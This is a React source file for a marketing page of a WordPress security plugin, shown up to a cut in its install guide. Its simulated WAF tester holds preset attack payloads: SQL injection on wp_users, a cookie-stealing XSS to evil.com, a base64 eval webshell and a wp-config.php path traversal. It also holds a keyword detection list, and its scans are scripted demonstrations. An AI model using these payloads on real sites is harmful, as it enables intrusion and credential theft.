import { useState } from 'react';
import { Link } from 'react-router-dom';
import {
  Shield,
  Zap,
  Sparkles,
  Globe,
  Check,
  X,
  Download,
  ArrowRight,
  Lock,
  Clock,
  Radio,
  FileCheck,
  Eye,
  Sliders,
  HelpCircle,
  ExternalLink,
  ChevronDown,
  Layers,
  Award,
  Headphones,
  CheckCircle2,
  AlertCircle,
  Star,
  Search,
  Tag,
  ShieldCheck,
  Server,
  Activity,
  Flame,
  Key,
  FolderCheck,
  RefreshCw,
  Cpu,
  Terminal,
  FileCode,
  HardDrive,
  ShoppingCart,
  Play,
  XCircle,
  AlertTriangle
} from 'lucide-react';

const API_BASE = (import.meta.env.VITE_API_BASE || 'http://localhost:8000').replace(/\/+$/, '');
const PLUGIN_DOWNLOAD_URL = `${API_BASE}/downloads/mdefender-pro.zip`;

export default function WordPressProductSuite() {
  // Live Simulator States
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanStep, setScanStep] = useState('Idle');
  const [quarantinedFiles, setQuarantinedFiles] = useState([
    { name: 'wso_webshell.php.bak', path: '/wp-content/uploads/2026/10/', threat: 'WSO 4.2.5 Webshell', isolated: true },
    { name: 'c99_eval_backdoor.php', path: '/wp-content/uploads/cache/', threat: 'c99 AST Eval Injection', isolated: true },
  ]);

  // WAF Simulator State
  const [wafPayload, setWafPayload] = useState("admin' UNION SELECT 1,password,3 FROM wp_users--");
  const [isInspectingWaf, setIsInspectingWaf] = useState(false);
  const [wafVerdict, setWafVerdict] = useState({
    blocked: true,
    rule: '#WP-SQLI-1049 (AST Grammar Syntactic Match)',
    threat: 'SQL Injection targeting wp_users table',
    latency: '0.08ms',
    mysqlQueries: 0
  });

  // Country Blocking Simulator Toggle
  const [countryToggles, setCountryToggles] = useState({
    RU: true,
    CN: true,
    IR: true,
    KP: true,
  });

  // Run Simulated WP Uploads Scanner
  const handleRunScanner = () => {
    setIsScanning(true);
    setScanProgress(15);
    setScanStep('Traversing /wp-content/uploads/ hierarchy...');

    setTimeout(() => {
      setScanProgress(55);
      setScanStep('Analyzing PHP AST AST tokens & base64 eval() patterns...');
    }, 700);

    setTimeout(() => {
      setScanProgress(90);
      setScanStep('Moving hostile payloads to .quarantine_vault (.htaccess locked)...');
    }, 1400);

    setTimeout(() => {
      setIsScanning(false);
      setScanProgress(100);
      setScanStep('Scan Complete: All directories verified clean.');
    }, 2000);
  };

  // Run WAF Inspection
  const handleInspectPayload = (sampleText) => {
    const payload = (sampleText !== undefined ? sampleText : wafPayload).toLowerCase();
    if (sampleText !== undefined) setWafPayload(sampleText);

    setIsInspectingWaf(true);
    setTimeout(() => {
      let isAttack = false;
      let detectedThreat = 'Clean Legitimate Ingress Traffic';
      let ruleId = 'CLEAN_PASS (Pre-Boot Normalizer)';

      if (payload.includes('union') || payload.includes('select') || payload.includes("'") || payload.includes('--') || payload.includes('/*')) {
        isAttack = true;
        detectedThreat = 'SQL Injection (SQLi)';
        ruleId = '#WP-SQLI-1049 (AST Syntactic Match)';
      } else if (payload.includes('<script') || payload.includes('onerror') || payload.includes('javascript:') || payload.includes('alert(')) {
        isAttack = true;
        detectedThreat = 'Cross-Site Scripting (XSS)';
        ruleId = '#WP-XSS-2088 (HTML5 Sanitizer)';
      } else if (payload.includes('eval(') || payload.includes('base64_decode') || payload.includes('system(') || payload.includes('exec(')) {
        isAttack = true;
        detectedThreat = 'Remote Code Execution / Webshell Ingress';
        ruleId = '#WP-RCE-3041 (Execution Vector Filter)';
      } else if (payload.includes('../') || payload.includes('..\\') || payload.includes('/etc/passwd') || payload.includes('wp-config.php')) {
        isAttack = true;
        detectedThreat = 'Local File Inclusion (LFI)';
        ruleId = '#WP-LFI-4019 (Path Backtrack Guard)';
      }

      setWafVerdict({
        blocked: isAttack,
        threat: detectedThreat,
        rule: ruleId,
        latency: (0.07 + Math.random() * 0.04).toFixed(2) + 'ms',
        mysqlQueries: 0
      });
      setIsInspectingWaf(false);
    }, 200);
  };

  return (
    <div style={{
      color: '#10201E',
      fontFamily: "'Plus Jakarta Sans', 'Inter', -apple-system, BlinkMacSystemFont, sans-serif",
      position: 'relative',
      paddingBottom: '80px'
    }}>

      {/* ========================================================================= */}
      {/* 1. HERO SECTION (MATCHING PRICING PAGE AESTHETICS)                        */}
      {/* ========================================================================= */}
      <section style={{
        paddingTop: '20px',
        paddingBottom: '60px',
        textAlign: 'center',
        position: 'relative',
        zIndex: 1,
      }}>
        <div style={{
          maxWidth: '1180px',
          margin: '0 auto',
          padding: '0 clamp(20px, 3.2vw, 32px)',
        }}>
          {/* Eyebrow Pill */}
          <div style={{
            display: 'inline-flex',
            alignItems: 'center',
            gap: '8px',
            padding: '6px 14px',
            borderRadius: '999px',
            background: '#E8EEE8',
            border: '1px solid #D9E1DC',
            fontSize: '11px',
            fontWeight: 700,
            color: '#E8792F',
            letterSpacing: '0.14em',
            textTransform: 'uppercase',
            marginBottom: '20px',
          }}>
            <Shield size={13} strokeWidth={2.4} style={{ color: '#2A8B68' }} />
            <span>Official MDefender Pro WordPress Plugin</span>
          </div>

          {/* Editorial Headline */}
          <h1 style={{
            fontSize: 'clamp(36px, 4.6vw, 56px)',
            fontWeight: 800,
            lineHeight: 1.05,
            letterSpacing: '-0.065em',
            color: '#10201E',
            maxWidth: '920px',
            margin: '0 auto 20px',
          }}>
            Autonomous Kernel Protection for{' '}
            <span style={{ color: '#E8792F' }}>WordPress &amp; WooCommerce.</span>
          </h1>

          {/* Subheading */}
          <p style={{
            fontSize: 'clamp(15px, 1.8vw, 17px)',
            lineHeight: 1.6,
            color: '#4A5D5A',
            maxWidth: '740px',
            margin: '0 auto 36px',
          }}>
            MDefender Pro executes at the pre-boot PHP layer before MySQL connections or themes initialize. Neutralize zero-days, quarantine hidden webshells, and enforce Country Blocking with <strong>0.00ms database overhead</strong>.
          </p>

          {/* Primary Action Group */}
          <div style={{
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center',
            gap: '14px',
            flexWrap: 'wrap',
            marginBottom: '40px'
          }}>
            <a
              href={PLUGIN_DOWNLOAD_URL}
              download="mdefender-pro.zip"
              style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: '10px',
                padding: '14px 28px',
                borderRadius: '12px',
                background: '#0B2522',
                color: '#FFFFFF',
                fontSize: '15px',
                fontWeight: 700,
                textDecoration: 'none',
                boxShadow: '0 4px 18px rgba(11, 37, 34, 0.25)',
                transition: 'all 0.2s ease',
              }}
              onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = '#153B34'; e.currentTarget.style.transform = 'translateY(-2px)'; }}
              onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = '#0B2522'; e.currentTarget.style.transform = 'none'; }}
            >
              <Download size={18} strokeWidth={2.4} />
              <span>Download Official Plugin (.zip)</span>
              <span style={{
                background: '#E8792F',
                color: '#FFFFFF',
                fontSize: '11px',
                fontWeight: 800,
                padding: '2px 8px',
                borderRadius: '999px',
                marginLeft: '4px'
              }}>
                v4.3.0 · 1.4 MB
              </span>
            </a>

            <Link
              to="/user/connect"
              style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px',
                padding: '14px 24px',
                borderRadius: '12px',
                background: '#FFFFFF',
                border: '1.5px solid #D9E1DC',
                color: '#10201E',
                fontSize: '14.5px',
                fontWeight: 700,
                textDecoration: 'none',
                transition: 'all 0.2s ease',
              }}
              onMouseEnter={(e) => { e.currentTarget.style.borderColor = '#0B2522'; e.currentTarget.style.transform = 'translateY(-2px)'; }}
              onMouseLeave={(e) => { e.currentTarget.style.borderColor = '#D9E1DC'; e.currentTarget.style.transform = 'none'; }}
            >
              <Key size={16} strokeWidth={2.4} />
              <span>Get API License Key</span>
              <ArrowRight size={14} strokeWidth={2.4} />
            </Link>
          </div>

          {/* Quick Specifications Strip */}
          <div style={{
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center',
            gap: '24px',
            flexWrap: 'wrap',
            fontSize: '13px',
            fontWeight: 600,
            color: '#60716B'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
              <CheckCircle2 size={15} strokeWidth={2.6} style={{ color: '#2A8B68' }} />
              <span>0.00ms Database Attack Overhead</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
              <CheckCircle2 size={15} strokeWidth={2.6} style={{ color: '#2A8B68' }} />
              <span>Pre-Boot mu-plugins Kernel Hook</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
              <CheckCircle2 size={15} strokeWidth={2.6} style={{ color: '#2A8B68' }} />
              <span>Compatible with WP Rocket, LiteSpeed, Redis Cache</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
              <CheckCircle2 size={15} strokeWidth={2.6} style={{ color: '#2A8B68' }} />
              <span>100% WooCommerce Checkout Armor</span>
            </div>
          </div>
        </div>
      </section>

      {/* ========================================================================= */}
      {/* 2. TRUST STRIP (#0B2522)                                                  */}
      {/* ========================================================================= */}
      <section style={{
        background: '#0B2522',
        color: '#ffffff',
        minHeight: '68px',
        padding: '16px 0',
        borderTop: '1px solid rgba(255, 255, 255, 0.08)',
        borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
        display: 'flex',
        alignItems: 'center',
        margin: '0 0 80px',
      }}>
        <div style={{
          maxWidth: '1180px',
          margin: '0 auto',
          width: '100%',
          padding: '0 clamp(20px, 3.2vw, 32px)',
        }}>
          <div
            className="trust-strip-grid"
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              gap: '24px',
              fontSize: '12.5px',
              fontWeight: 600,
              color: '#E8EEE8',
              flexWrap: 'wrap'
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <ShieldCheck size={16} strokeWidth={2.4} style={{ color: '#2A8B68' }} />
              <span>Real-Time Country Blocking &amp; GeoIP Restriction Included</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <FolderCheck size={16} strokeWidth={2.4} style={{ color: '#E8792F' }} />
              <span>Deep Uploads Directory AST Heuristics &amp; Auto-Quarantine</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <Activity size={16} strokeWidth={2.4} style={{ color: '#2A8B68' }} />
              <span>Zero-Downtime Hot Reload &amp; Continuous Telemetry Sync</span>
            </div>
          </div>
        </div>
      </section>

      {/* ========================================================================= */}
      {/* 3. HOW IT WORKS (যে ওয়ার্ডপ্রেস কীভাবে কাজ করে)                                */}
      {/* ========================================================================= */}
      <section style={{
        maxWidth: '1180px',
        margin: '0 auto 96px',
        padding: '0 clamp(20px, 3.2vw, 32px)',
      }}>
        <div style={{ textAlign: 'center', marginBottom: '52px' }}>
          <div style={{
            fontSize: '11px',
            fontWeight: 700,
            color: '#E8792F',
            textTransform: 'uppercase',
            letterSpacing: '0.14em',
            marginBottom: '8px',
          }}>
            Technical Architecture
          </div>
          <h2 style={{
            fontSize: 'clamp(28px, 3.6vw, 42px)',
            fontWeight: 800,
            letterSpacing: '-0.06em',
            color: '#10201E',
            lineHeight: 1.1,
            marginBottom: '14px',
          }}>
            How MDefender Pro Protects WordPress
          </h2>
          <p style={{
            fontSize: '15.5px',
            lineHeight: 1.6,
            color: '#4A5D5A',
            maxWidth: '640px',
            margin: '0 auto',
          }}>
            Our pre-boot pipeline operates before standard WordPress plugins or themes, neutralizing threats before any PHP database query or file execution can occur.
          </p>
        </div>

        {/* 5-Step Architecture Cards Grid */}
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(210px, 1fr))',
          gap: '16px',
        }}>
          {[
            {
              step: '01',
              title: 'Pre-Boot Ingress Hook',
              desc: 'Fires in mu-plugins before wp-config.php or MySQL database connections are initialized.',
              icon: Zap,
              metric: '0.00ms DB',
              accent: '#E8792F'
            },
            {
              step: '02',
              title: 'Sub-Millisecond WAF',
              desc: 'Evaluates GET/POST and cookies against 50,000+ signatures and syntactic AST SQLi/XSS grammar.',
              icon: Shield,
              metric: '<0.10ms Latency',
              accent: '#2A8B68'
            },
            {
              step: '03',
              title: 'Country & GeoIP Filter',
              desc: 'Enforces geofencing rules (RU, CN, etc.), dropping hostile bots before wp-login or XML-RPC.',
              icon: Globe,
              metric: 'Line-Rate Drop',
              accent: '#0284C7'
            },
            {
              step: '04',
              title: 'Heuristic Quarantine',
              desc: 'Scans /uploads/ for c99/WSO shells and moves backdoors to an encrypted, .htaccess-locked vault.',
              icon: FolderCheck,
              metric: 'Auto-Vaulted',
              accent: '#7C3AED'
            },
            {
              step: '05',
              title: 'Cloud SOC Telemetry',
              desc: 'Synchronizes blocks, attack signatures, and audit logs with your central customer dashboard.',
              icon: Radio,
              metric: 'Live Sync',
              accent: '#059669'
            },
          ].map((item, idx) => {
            const Icon = item.icon;
            return (
              <div
                key={idx}
                style={{
                  background: '#FFFFFF',
                  borderRadius: '16px',
                  border: '1px solid #D9E1DC',
                  padding: '24px 20px',
                  display: 'flex',
                  flexDirection: 'column',
                  justifyContent: 'space-between',
                  boxShadow: '0 4px 16px rgba(11, 37, 34, 0.04)',
                  position: 'relative',
                  transition: 'transform 0.2s ease, box-shadow 0.2s ease'
                }}
                onMouseEnter={(e) => { e.currentTarget.style.transform = 'translateY(-4px)'; e.currentTarget.style.boxShadow = '0 12px 30px rgba(11, 37, 34, 0.08)'; }}
                onMouseLeave={(e) => { e.currentTarget.style.transform = 'none'; e.currentTarget.style.boxShadow = '0 4px 16px rgba(11, 37, 34, 0.04)'; }}
              >
                <div>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '14px' }}>
                    <span style={{ fontSize: '12px', fontWeight: 900, color: '#E8792F', fontFamily: 'monospace' }}>
                      STEP {item.step}
                    </span>
                    <span style={{
                      fontSize: '10.5px',
                      fontWeight: 700,
                      color: item.accent,
                      background: '#F4F7F4',
                      padding: '3px 8px',
                      borderRadius: '999px',
                      border: '1px solid #D9E1DC'
                    }}>
                      {item.metric}
                    </span>
                  </div>

                  <div style={{
                    width: '38px',
                    height: '38px',
                    borderRadius: '10px',
                    background: '#E8EEE8',
                    border: '1px solid #D9E1DC',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    color: '#0B2522',
                    marginBottom: '14px'
                  }}>
                    <Icon size={19} strokeWidth={2.4} />
                  </div>

                  <h3 style={{ fontSize: '16px', fontWeight: 800, color: '#10201E', margin: '0 0 8px' }}>
                    {item.title}
                  </h3>
                  <p style={{ fontSize: '12.5px', color: '#60716B', lineHeight: 1.5, margin: 0 }}>
                    {item.desc}
                  </p>
                </div>
              </div>
            );
          })}
        </div>
      </section>

      {/* ========================================================================= */}
      {/* 4. CORE FEATURES SHOWCASE (কী কী ফিচার আমরা অফার করছি)                       */}
      {/* ========================================================================= */}
      <section style={{
        background: '#E8EEE8',
        padding: '96px 0',
        borderTop: '1px solid #D9E1DC',
        borderBottom: '1px solid #D9E1DC',
        marginBottom: '96px'
      }}>
        <div style={{
          maxWidth: '1180px',
          margin: '0 auto',
          padding: '0 clamp(20px, 3.2vw, 32px)',
        }}>
          <div style={{ textAlign: 'center', marginBottom: '48px' }}>
            <div style={{
              fontSize: '11px',
              fontWeight: 700,
              color: '#E8792F',
              textTransform: 'uppercase',
              letterSpacing: '0.14em',
              marginBottom: '8px',
            }}>
              Comprehensive Feature Matrix
            </div>
            <h2 style={{
              fontSize: 'clamp(28px, 3.6vw, 42px)',
              fontWeight: 800,
              letterSpacing: '-0.06em',
              color: '#10201E',
              lineHeight: 1.1,
              marginBottom: '12px',
            }}>
              Full-Spectrum Security Capabilities
            </h2>
            <p style={{
              fontSize: '15.5px',
              lineHeight: 1.6,
              color: '#4A5D5A',
              maxWidth: '600px',
              margin: '0 auto',
            }}>
              Everything required to harden your WordPress core, prevent plugin exploits, and maintain fast, seamless WooCommerce conversions.
            </p>
          </div>

          {/* 8 Feature Cards Grid */}
          <div style={{
            display: 'grid',
            gridTemplateColumns: 'repeat(auto-fit, minmax(270px, 1fr))',
            gap: '18px',
          }}>
            {[
              {
                title: 'Zero-Overhead mu-plugins WAF',
                desc: 'Rejects attack requests before expensive MySQL connections are initialized. Saves 100% of origin CPU and database pool resources during bot spikes.',
                icon: Zap,
                badge: 'KERNEL HOOK'
              },
              {
                title: 'Country & GeoIP Blocking',
                desc: 'Block traffic, brute-force bots, and web scrapers from entire geographic regions (RU, CN, KP, IR) with customizable 403 Forbidden screens.',
                icon: Globe,
                badge: 'GEO-FENCING'
              },
              {
                title: 'Deep Uploads Heuristic Scanner',
                desc: 'Scans /wp-content/uploads/ for obfuscated webshells (c99, r57, b374k, WSO) and automatically moves hostile files to an encrypted quarantine vault.',
                icon: FolderCheck,
                badge: 'AUTO-QUARANTINE'
              },
              {
                title: 'Brute-Force & XML-RPC Shield',
                desc: 'Enforces rate limits on /xmlrpc.php and wp-login.php, neutralizing distributed dictionary botnets before connection thread starvation occurs.',
                icon: Lock,
                badge: 'ANTI-BRUTEFORCE'
              },
              {
                title: 'WooCommerce Armor',
                desc: 'Shields cart and checkout endpoints against automated credit card testing bots, inventory hoarding scripts, and coupon bruteforce tools.',
                icon: ShoppingCart,
                badge: 'ECOMMERCE SAFE'
              },
              {
                title: 'WordPress Core Integrity Check',
                desc: 'Performs cryptographic checksum comparisons of core PHP files against official WordPress.org release hashes to uncover backdoor modifications.',
                icon: FileCheck,
                badge: 'CHECKSUM AUDIT'
              },
              {
                title: '2FA & Invisible Turnstile PoW',
                desc: 'Native Two-Factor Authentication with Google Authenticator and frictionless hardware-accelerated Proof-of-Work to stop scrapers without annoying image puzzles.',
                icon: Key,
                badge: 'ZERO-CAPTCHA'
              },
              {
                title: 'Live Cloud SOC Telemetry',
                desc: 'Synchronizes blocks and security alerts directly to your centralized MDefender Pro customer dashboard for multi-site fleet management.',
                icon: Radio,
                badge: 'CLOUD SYNC'
              },
            ].map((feat, idx) => {
              const Icon = feat.icon;
              return (
                <div
                  key={idx}
                  style={{
                    background: '#FFFFFF',
                    borderRadius: '16px',
                    border: '1px solid #D9E1DC',
                    padding: '26px 22px',
                    display: 'flex',
                    flexDirection: 'column',
                    justifyContent: 'space-between',
                    boxShadow: '0 4px 18px rgba(11, 37, 34, 0.04)',
                    transition: 'transform 0.2s ease, box-shadow 0.2s ease'
                  }}
                  onMouseEnter={(e) => { e.currentTarget.style.transform = 'translateY(-3px)'; e.currentTarget.style.boxShadow = '0 10px 24px rgba(11, 37, 34, 0.08)'; }}
                  onMouseLeave={(e) => { e.currentTarget.style.transform = 'none'; e.currentTarget.style.boxShadow = '0 4px 18px rgba(11, 37, 34, 0.04)'; }}
                >
                  <div>
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '14px' }}>
                      <div style={{
                        width: '38px',
                        height: '38px',
                        borderRadius: '10px',
                        background: '#FFF4ED',
                        border: '1px solid #FCD3B6',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        color: '#E8792F',
                      }}>
                        <Icon size={19} strokeWidth={2.4} />
                      </div>
                      <span style={{
                        fontSize: '9.5px',
                        fontWeight: 700,
                        color: '#60716B',
                        background: '#E8EEE8',
                        padding: '3px 8px',
                        borderRadius: '999px',
                        letterSpacing: '0.06em'
                      }}>
                        {feat.badge}
                      </span>
                    </div>

                    <h3 style={{ fontSize: '17px', fontWeight: 800, color: '#10201E', margin: '0 0 8px' }}>
                      {feat.title}
                    </h3>
                    <p style={{ fontSize: '13px', color: '#60716B', lineHeight: 1.55, margin: 0 }}>
                      {feat.desc}
                    </p>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* ========================================================================= */}
      {/* 5. LIVE INTERACTIVE SIMULATOR (TEST THE WORDPRESS SHIELD)                  */}
      {/* ========================================================================= */}
      <section style={{
        maxWidth: '1180px',
        margin: '0 auto 96px',
        padding: '0 clamp(20px, 3.2vw, 32px)',
      }}>
        <div style={{ textAlign: 'center', marginBottom: '44px' }}>
          <div style={{
            fontSize: '11px',
            fontWeight: 700,
            color: '#E8792F',
            textTransform: 'uppercase',
            letterSpacing: '0.14em',
            marginBottom: '8px',
          }}>
            Interactive Testing Sandbox
          </div>
          <h2 style={{
            fontSize: 'clamp(28px, 3.6vw, 42px)',
            fontWeight: 800,
            letterSpacing: '-0.06em',
            color: '#10201E',
            lineHeight: 1.1,
            marginBottom: '12px',
          }}>
            Experience the WordPress Shield in Action
          </h2>
          <p style={{
            fontSize: '15.5px',
            lineHeight: 1.6,
            color: '#4A5D5A',
            maxWidth: '620px',
            margin: '0 auto',
          }}>
            Simulate real attack payloads against the pre-boot AST WAF and execute live file quarantine scans.
          </p>
        </div>

        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(360px, 1fr))',
          gap: '24px',
        }}>
          {/* Box 1: Pre-Boot AST WAF Simulator */}
          <div style={{
            background: '#FFFFFF',
            borderRadius: '16px',
            border: '1px solid #D9E1DC',
            padding: '28px',
            boxShadow: '0 10px 30px rgba(11, 37, 34, 0.05)',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'space-between'
          }}>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '14px' }}>
                <Terminal size={18} strokeWidth={2.4} style={{ color: '#E8792F' }} />
                <h3 style={{ fontSize: '18px', fontWeight: 800, color: '#10201E', margin: 0 }}>
                  Pre-Boot WAF Injection Test
                </h3>
              </div>
              <p style={{ fontSize: '13px', color: '#60716B', margin: '0 0 16px', lineHeight: 1.5 }}>
                Test attack patterns against the AST grammar parser. Notice the 0.00ms database impact.
              </p>

              {/* Sample Payload Presets */}
              <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap', marginBottom: '14px' }}>
                {[
                  { label: 'SQLi', val: "admin' UNION SELECT 1,password,3 FROM wp_users--" },
                  { label: 'XSS', val: '<script>fetch("https://evil.com?c="+document.cookie)</script>' },
                  { label: 'RCE Shell', val: "eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7'))" },
                  { label: 'LFI Config', val: "../../../../wp-config.php\0" },
                  { label: 'Safe Traffic', val: "Hello world legitimate WordPress comment" },
                ].map((preset, pIdx) => (
                  <button
                    key={pIdx}
                    type="button"
                    onClick={() => handleInspectPayload(preset.val)}
                    style={{
                      border: '1px solid #D9E1DC',
                      background: '#F8FAFC',
                      padding: '4px 10px',
                      borderRadius: '6px',
                      fontSize: '11.5px',
                      fontWeight: 600,
                      color: '#475569',
                      cursor: 'pointer'
                    }}
                  >
                    {preset.label}
                  </button>
                ))}
              </div>

              {/* Payload Input */}
              <div style={{ marginBottom: '18px' }}>
                <textarea
                  rows={2}
                  value={wafPayload}
                  onChange={(e) => setWafPayload(e.target.value)}
                  style={{
                    width: '100%',
                    padding: '10px 12px',
                    borderRadius: '8px',
                    border: '1px solid #D9E1DC',
                    background: '#F8FAFC',
                    fontFamily: 'monospace',
                    fontSize: '12px',
                    color: '#0F172A',
                    boxSizing: 'border-box',
                    outline: 'none'
                  }}
                />
              </div>

              <button
                type="button"
                onClick={() => handleInspectPayload()}
                disabled={isInspectingWaf}
                style={{
                  width: '100%',
                  padding: '11px',
                  borderRadius: '9px',
                  background: '#0B2522',
                  color: '#FFFFFF',
                  fontWeight: 700,
                  fontSize: '13px',
                  border: 'none',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '6px',
                  marginBottom: '18px'
                }}
              >
                <Play size={14} />
                <span>{isInspectingWaf ? 'Inspecting...' : 'Test Ingress Payload'}</span>
              </button>
            </div>

            {/* Verdict Output Box */}
            <div style={{
              background: wafVerdict.blocked ? '#FFF4ED' : '#F0FDF4',
              border: `1.5px solid ${wafVerdict.blocked ? '#FCD3B6' : '#BBF7D0'}`,
              borderRadius: '10px',
              padding: '14px 16px',
            }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '6px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                  {wafVerdict.blocked ? (
                    <XCircle size={16} strokeWidth={2.4} style={{ color: '#DC2626' }} />
                  ) : (
                    <CheckCircle2 size={16} strokeWidth={2.4} style={{ color: '#16A34A' }} />
                  )}
                  <span style={{ fontSize: '13px', fontWeight: 800, color: wafVerdict.blocked ? '#DC2626' : '#16A34A' }}>
                    {wafVerdict.blocked ? 'BLOCKED AT KERNEL (403 FORBIDDEN)' : 'CLEAN PASS (200 OK)'}
                  </span>
                </div>
                <span style={{ fontSize: '11px', fontWeight: 700, color: '#64748B' }}>
                  {wafVerdict.latency}
                </span>
              </div>
              <div style={{ fontSize: '11.5px', color: '#334155', fontWeight: 600 }}>
                {wafVerdict.threat}
              </div>
              <div style={{ fontSize: '10.5px', color: '#64748B', fontFamily: 'monospace', marginTop: '4px' }}>
                Rule: {wafVerdict.rule} · MySQL Impact: {wafVerdict.mysqlQueries} queries
              </div>
            </div>
          </div>

          {/* Box 2: Deep Uploads Directory Scanner Simulator */}
          <div style={{
            background: '#FFFFFF',
            borderRadius: '16px',
            border: '1px solid #D9E1DC',
            padding: '28px',
            boxShadow: '0 10px 30px rgba(11, 37, 34, 0.05)',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'space-between'
          }}>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '14px' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <FolderCheck size={18} strokeWidth={2.4} style={{ color: '#2A8B68' }} />
                  <h3 style={{ fontSize: '18px', fontWeight: 800, color: '#10201E', margin: 0 }}>
                    Uploads Directory Malware Vault
                  </h3>
                </div>
                <span style={{ fontSize: '11px', fontWeight: 700, color: '#2A8B68', background: '#E8EEE8', padding: '3px 8px', borderRadius: '6px' }}>
                  Active Vault
                </span>
              </div>
              <p style={{ fontSize: '13px', color: '#60716B', margin: '0 0 16px', lineHeight: 1.5 }}>
                Simulates real-time heuristic scans across `/wp-content/uploads/` and plugin directories.
              </p>

              {/* Scan Trigger Button */}
              <button
                type="button"
                onClick={handleRunScanner}
                disabled={isScanning}
                style={{
                  width: '100%',
                  padding: '11px',
                  borderRadius: '9px',
                  background: '#0B2522',
                  color: '#FFFFFF',
                  fontWeight: 700,
                  fontSize: '13px',
                  border: 'none',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  marginBottom: '16px'
                }}
              >
                <RefreshCw size={14} className={isScanning ? 'hud-scan-pulse' : ''} />
                <span>{isScanning ? scanStep : 'Run Live Uploads Directory Scan'}</span>
              </button>

              {/* Progress Bar */}
              {isScanning && (
                <div style={{ height: '6px', background: '#E2E8F0', borderRadius: '999px', overflow: 'hidden', marginBottom: '16px' }}>
                  <div style={{ width: `${scanProgress}%`, height: '100%', background: '#2A8B68', transition: 'width 0.4s ease' }} />
                </div>
              )}

              {/* Quarantined Threat Vault List */}
              <div style={{ fontSize: '11px', fontWeight: 700, color: '#64748B', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: '8px' }}>
                Isolated Threat Vault (2 Threats Neutralized):
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginBottom: '14px' }}>
                {quarantinedFiles.map((file, fIdx) => (
                  <div
                    key={fIdx}
                    style={{
                      background: '#F8FAFC',
                      border: '1px solid #E2E8F0',
                      borderRadius: '8px',
                      padding: '10px 12px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between'
                    }}
                  >
                    <div>
                      <div style={{ fontSize: '12px', fontWeight: 700, color: '#0F172A', fontFamily: 'monospace' }}>
                        {file.name}
                      </div>
                      <div style={{ fontSize: '10.5px', color: '#64748B' }}>
                        {file.path} · {file.threat}
                      </div>
                    </div>
                    <span style={{ fontSize: '10px', fontWeight: 700, color: '#16A34A', background: '#DCFCE7', padding: '2px 6px', borderRadius: '4px' }}>
                      Quarantined
                    </span>
                  </div>
                ))}
              </div>
            </div>

            <div style={{ fontSize: '11px', color: '#60716B', textAlign: 'center', borderTop: '1px solid #E2E8F0', paddingTop: '10px' }}>
              Files isolated inside <code>.quarantine_vault</code> cannot execute and cannot damage your site.
            </div>
          </div>
        </div>
      </section>

      {/* ========================================================================= */}
      {/* 6. 3-STEP QUICK INSTALLATION WALKTHROUGH (কীভাবে ইন্সটল করবে)               */}
      {/* ========================================================================= */}
      <section style={{
        maxWidth: '1180px',
        margin: '0 auto 80px',
        padding: '0 clamp(20px, 3.2vw, 32px)',
      }}>
        <div style={{
          background: '#FFFFFF',
          borderRadius: '20px',
          border: '1px solid #D9E1DC',
          padding: '44px 36px',
          boxShadow: '0 12px 36px rgba(11, 37, 34, 0.05)',
        }}>
          <div style={{ textAlign: 'center', marginBottom: '36px' }}>
            <span style={{
              fontSize: '11px',
              fontWeight: 700,
              color: '#E8792F',
              textTransform: 'uppercase',
              letterSpacing: '0.14em',
              background: '#E8EEE8',
              padding: '4px 12px',
              borderRadius: '999px',
              display: 'inline-block',
              marginBottom: '10px'
            }}>
              Quick Deployment Guide
            </span>
            <h2 style={{ fontSize: '28px', fontWeight: 800, color: '#10201E', margin: '0 0 10px' }}>
              How to Install MDefender Pro in Under 60 Seconds
            </h2>
            <p style={{ fontSize: '14.5px', color: '#4A5D5A', margin: 0 }}>
              Zero coding or server reconfiguration required. Follow these three simple steps:
            </p>
          </div>

          <div style={{
            display: 'grid',
            gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))',
            gap: '24px',
          }}>
            <div style={{
              padding: '24px',
              borderRadius: '14px',
              background: '#F8FAFC',
